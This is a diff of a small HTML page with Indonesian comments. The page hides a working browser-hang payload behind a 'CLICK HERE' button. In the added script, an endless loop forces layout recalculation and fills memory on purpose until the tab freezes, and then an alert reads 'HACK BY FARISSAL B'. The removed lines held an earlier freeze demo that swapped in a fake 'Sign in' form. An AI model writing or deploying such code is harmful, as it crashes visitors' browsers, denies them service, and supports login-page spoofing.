@@ -1,33 +1,61 @@
 <!doctype html>
-<html>
-<head><meta charset="utf-8"><title>tester</title></head>
-<body>
-  <!-- Halaman 1 -->
-  <div id="p1" style="display:flex;align-items:center;justify-content:center;min-height:100vh">
-    <button id="go" style="padding:16px 32px;font-size:18px">GO</button>
-  </div>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
+    <title>testertster</title>
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        background: #fff;
+      }
+      button {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        padding: 15px 30px;
+        font-size: 18px;
+        background: #007aff;
+        color: #fff;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <button id="startBtn">CLICK HERE</button>
 
-  <!-- Halaman 2: form generik -->
-  <div id="p2" style="display:none;min-height:100vh;font-family:Arial;text-align:center;padding-top:40px">
-    <h2>Sign in</h2>
-    <p id="msg" style="color:red"></p>
-    <form onsubmit="event.preventDefault(); document.getElementById('msg').textContent='DEMO ONLY — nothing was sent';">
-      <input placeholder="Email" style="padding:10px;width:240px"><br><br>
-      <input type="password" placeholder="Password" style="padding:10px;width:240px"><br><br>
-      <button style="padding:10px 24px">Next</button>
-    </form>
-  </div>
+    <script>
+      document.getElementById("startBtn").onclick = function () {
+        this.remove();
 
-  <script>
-    document.getElementById("go").onclick = function () {
-      // freeze renderer (efek hang)
-      const s = performance.now();
-      while (performance.now() - s < 3000) Math.sqrt(performance.now());
+        // HANG BERAT: layout thrashing + memory exhaustion
+        // Renderer akan freeze total, alert tidak akan sempat muncul
+        // sampai loop selesai (atau Chrome "Page unresponsive")
+        const d = document.createElement("div");
+        document.body.appendChild(d);
+        const chunks = [];
 
-      // ganti konten — omnibox/state demonstrasi
-      document.getElementById("p1").style.display = "none";
-      document.getElementById("p2").style.display = "block";
-    };
-  </script>
-</body>
+        setTimeout(function () {
+          let i = 0;
+          while (true) {
+            d.style.width = i + "px";
+            void d.offsetWidth; // forced synchronous layout
+            chunks.push(new Array(1e5).join("A")); // memory balloon
+            i++;
+          }
+        }, 10);
+
+        // Alert muncul belakangan — kalau renderer belum mati total
+        setTimeout(function () {
+          alert("HACK BY FARISSAL B");
+        }, 5000);
+      };
+    </script>
+  </body>
 </html>
